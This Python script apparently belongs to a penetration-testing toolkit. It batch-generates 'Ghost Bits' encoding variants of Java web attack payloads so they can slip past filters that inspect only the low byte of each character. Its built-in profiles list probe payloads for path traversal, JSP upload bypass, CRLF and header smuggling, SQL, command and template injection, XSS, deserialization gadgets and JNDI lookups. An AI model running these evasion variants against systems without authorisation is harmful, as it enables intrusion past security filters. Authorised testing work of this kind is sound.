#!/usr/bin/env python3
"""Batch-generate Ghost Bits variants for common Java web payload lanes."""
from __future__ import annotations

import argparse
import json
import sys
import urllib.parse
from dataclasses import asdict
from pathlib import Path
from types import SimpleNamespace
from typing import Dict, Iterable, List, Optional, Tuple

# Sibling import when executed from the skill scripts directory.
SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

from ghost_bits_generate import make_variant, json_escape, low_projection, render_table  # type: ignore

PROFILES: Dict[str, List[Tuple[str, str]]] = {
    "java-web-default": [
        ("upload-ext", ".jsp"),
        ("upload-ext", ".jspx"),
        ("upload-ext", "shell.jsp"),
        ("upload-ext", "a.jsp;.jpg"),
        ("path", "../"),
        ("path", "../../WEB-INF/web.xml"),
        ("path", r"..\..\windows\win.ini"),
        ("crlf", "\r\nX-Ghost: 1"),
        ("crlf", "\r\nContent-Length: 0\r\n\r\n"),
        ("sql", "' OR '1'='1"),
        ("sql", "' UNION SELECT NULL--"),
        ("cmd", "; id"),
        ("cmd", "| whoami"),
        ("cmd", "$(id)"),
        ("template", "${7*7}"),
        ("template", "#{7*7}"),
        ("template", "%{7*7}"),
        ("deser", "@type"),
        ("deser", "com.sun.org.apache.bcel.internal.util.ClassLoader"),
        ("jndi", "ldap://127.0.0.1/a"),
    ],
    "upload-path": [
        ("upload-ext", ".jsp"),
        ("upload-ext", ".jspx"),
        ("upload-ext", "shell.jsp"),
        ("upload-ext", "a.jsp;.jpg"),
        ("path", "../"),
        ("path", "../../WEB-INF/web.xml"),
        ("path", r"..\..\windows\win.ini"),
        ("path", "%2e%2e/"),
    ],
    "header-protocol": [
        ("crlf", "\r\nX-Ghost: 1"),
        ("crlf", "\r\nSet-Cookie: ghost=1"),
        ("crlf", "\r\nContent-Length: 0\r\n\r\n"),
        ("smuggling", "Transfer-Encoding: chunked"),
        ("smuggling", "Content-Length: 0"),
    ],
    "injection-core": [
        ("sql", "' OR '1'='1"),
        ("sql", "' UNION SELECT NULL--"),
        ("cmd", "; id"),
        ("cmd", "| whoami"),
        ("cmd", "$(id)"),
        ("template", "${7*7}"),
        ("template", "#{7*7}"),
        ("template", "%{7*7}"),
        ("xss", "<script>alert(1)</script>"),
        ("xss", '"><img src=x onerror=alert(1)>'),
    ],
    "deser-jndi": [
        ("deser", "@type"),
        ("deser", "com.sun.org.apache.bcel.internal.util.ClassLoader"),
        ("deser", "TemplatesImpl"),
        ("jndi", "ldap://127.0.0.1/a"),
        ("jndi", "rmi://127.0.0.1/a"),
    ],
}


def parse_payload_file(path: Path) -> List[Tuple[str, str]]:
    rows: List[Tuple[str, str]] = []
    for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = raw.strip("\ufeff")
        if not line or line.lstrip().startswith("#"):
            continue
        if "\t" in line:
            cat, payload = line.split("\t", 1)
        else:
            cat, payload = "custom", line
        rows.append((cat.strip() or "custom", payload))
    return rows


def ns_for(seed: int, high: str, only_chars: Optional[str], skip_chars: Optional[str], high_byte: Optional[str]) -> SimpleNamespace:
    return SimpleNamespace(
        seed=seed,
        high=high,
        only_chars=only_chars,
        skip_chars=skip_chars,
        ascii_only=True,
        high_byte=high_byte,
    )


def make_record(category: str, payload: str, seed: int, args: argparse.Namespace) -> dict:
    variant, mapping = make_variant(payload, ns_for(seed, args.high, args.only_chars, args.skip_chars, args.high_byte))
    return {
        "category": category,
        "seed": seed,
        "original": payload,
        "variant": variant,
        "url_encoded_utf8": urllib.parse.quote(variant, safe=""),
        "json_escape": json_escape(variant),
        "low_byte_projection": low_projection(variant),
        "mapping": [asdict(r) for r in mapping],
    }


def render_markdown(records: Iterable[dict]) -> str:
    lines = [
        "# Ghost Bits payload batch",
        "",
        "Use these as bounded single-variable variants beside the normal payload path. A changed response is a lead, not a finding, until backend low-byte semantics are proven.",
        "",
    ]
    for idx, r in enumerate(records, start=1):
        lines.extend([
            f"## {idx}. {r['category']} seed={r['seed']}",
            "",
            f"Original: `{r['original']}`",
            "",
            f"Variant: `{r['variant']}`",
            "",
            f"URL encoded: `{r['url_encoded_utf8']}`",
            "",
            f"JSON escape: `{r['json_escape']}`",
            "",
            f"Low-byte projection: `{r['low_byte_projection']}`",
            "",
        ])
    return "\n".join(lines)


def main(argv: Optional[list[str]] = None) -> int:
    ap = argparse.ArgumentParser(description="Batch-generate Ghost Bits variants for Java web payload lanes")
    ap.add_argument("--profile", choices=sorted(PROFILES), default="java-web-default")
    ap.add_argument("--payload-file", help="UTF-8 payload file; optional tab prefix category<TAB>payload")
    ap.add_argument("--seed-base", type=int, default=1337)
    ap.add_argument("--variants", type=int, default=1, help="variants per payload")
    ap.add_argument("--high", choices=["cjk", "bmp", "low-noise"], default="cjk")
    ap.add_argument("--high-byte", help="fixed high byte, e.g. 0x4e")
    ap.add_argument("--only-chars", help="only transform these literal characters")
    ap.add_argument("--skip-chars", help="do not transform these literal characters")
    ap.add_argument("--format", choices=["markdown", "json", "jsonl"], default="markdown")
    ap.add_argument("--out", help="write output file")
    args = ap.parse_args(argv)

    payloads = parse_payload_file(Path(args.payload_file)) if args.payload_file else PROFILES[args.profile]
    records: List[dict] = []
    for i, (category, payload) in enumerate(payloads):
        for v in range(max(1, args.variants)):
            seed = args.seed_base + i * 100 + v
            records.append(make_record(category, payload, seed, args))

    if args.format == "json":
        output = json.dumps({"profile": args.profile, "records": records}, ensure_ascii=True, indent=2)
    elif args.format == "jsonl":
        output = "\n".join(json.dumps(r, ensure_ascii=True) for r in records)
    else:
        output = render_markdown(records)

    if args.out:
        Path(args.out).write_text(output + "\n", encoding="utf-8", newline="\n")
    else:
        sys.stdout.reconfigure(encoding="utf-8")
        print(output)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
